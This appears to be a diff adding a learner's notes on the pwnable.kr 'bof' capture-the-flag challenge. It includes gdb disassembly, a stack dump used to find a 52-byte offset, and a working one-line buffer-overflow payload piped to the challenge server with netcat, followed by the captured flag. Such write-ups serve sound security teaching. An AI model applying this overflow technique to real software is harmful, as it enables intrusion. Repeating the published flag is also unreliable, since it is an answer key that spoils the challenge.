@@ -1,1 +1,107 @@
-a
+alex@kali:~/Downloads/pwnable_kr$ gdb -q bof
+Reading symbols from bof...
+(No debugging symbols found in bof)
+(gdb) set disassembly-flavor intel
+(gdb) disas func
+Dump of assembler code for function func:
+   0x0000062c <+0>:	push   ebp
+   0x0000062d <+1>:	mov    ebp,esp
+   0x0000062f <+3>:	sub    esp,0x48
+   0x00000632 <+6>:	mov    eax,gs:0x14
+   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
+   0x0000063b <+15>:	xor    eax,eax
+   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
+   0x00000644 <+24>:	call   0x645 <func+25>
+   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
+   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
+   0x0000064f <+35>:	call   0x650 <func+36>
+   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x0000065b <+47>:	jne    0x66b <func+63>
+   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
+   0x00000664 <+56>:	call   0x665 <func+57>
+   0x00000669 <+61>:	jmp    0x677 <func+75>
+   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
+   0x00000672 <+70>:	call   0x673 <func+71>
+   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
+   0x00000681 <+85>:	je     0x688 <func+92>
+   0x00000683 <+87>:	call   0x684 <func+88>
+   0x00000688 <+92>:	leave  
+   0x00000689 <+93>:	ret    
+End of assembler dump.
+
+
+/////////////////////////////////////////////////////////////
+
+HERE IS CALL TO GETS: eax has the address of overflow me
+which is [ebp-0x2c]. so i need to overflow it to change value
+of key.
+
+   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
+   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
+   0x0000064f <+35>:	call   0x650 <func+36>
+
+Where is the 'key'?
+
+First of all its dynamically linked so in order to load I do:
+
+
+
+(gdb) b main
+Breakpoint 1 at 0x68d
+(gdb) r
+Starting program: /home/alex/Downloads/pwnable_kr/bof 
+
+Breakpoint 1, 0x5655568d in main ()
+
+
+
+
+Inset a breakpoint before comparison
+
+   0x56555654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
+
+(gdb) b *0x56555654
+Breakpoint 2 at 0x56555654
+
+I write 32 bytes and search for key value (0xdeadbeef):
+
+
+(gdb) c
+Continuing.
+overflow me : 
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH    
+
+Breakpoint 2, 0x56555654 in func ()
+(gdb) x/50wx $esp
+0xffffd0d0:	0xffffd0ec	0xffffd1d4	0xf7fae000	0xf7fac9e0
+0xffffd0e0:	0x00000000	0xf7fae000	0xf7ffc840	0x41414141
+0xffffd0f0:	0x42424242	0x43434343	0x44444444	0x45454545
+0xffffd100:	0x46464646	0x47474747	0x48484848	0x8f19ea00
+0xffffd110:	0x00600000	0x56556ff4	0xffffd138	0x5655569f
+0xffffd120:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
+0xffffd130:	0xf7fae000	0xf7fae000	0x00000000	0xf7df57e1
+0xffffd140:	0x00000001	0xffffd1d4	0xffffd1dc	0xffffd164
+0xffffd150:	0x00000001	0x00000000	0xf7fae000	0x00000000
+0xffffd160:	0xf7ffd000	0x00000000	0xf7fae000	0xf7fae000
+0xffffd170:	0x00000000	0x40df3503	0x01d2f313	0x00000000
+0xffffd180:	0x00000000	0x00000000	0x00000001	0x56555530
+0xffffd190:	0x00000000	0xf7fe9450
+
+
+which is in 0xffffd120. And i wrote until 0x48484848. So i have
+to write more 5 words more. 5 + 8 = 13 words or 13 * 4 -> 52 bytes
+
+
+
+TIME FOR THE TEST:
+
+alex@kali:~/Downloads/pwnable_kr$ (python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000
+cat flag
+daddy, I just pwned a buFFer :)
+^C
+
+
+
+
+flag{daddy, I just pwned a buFFer :)}
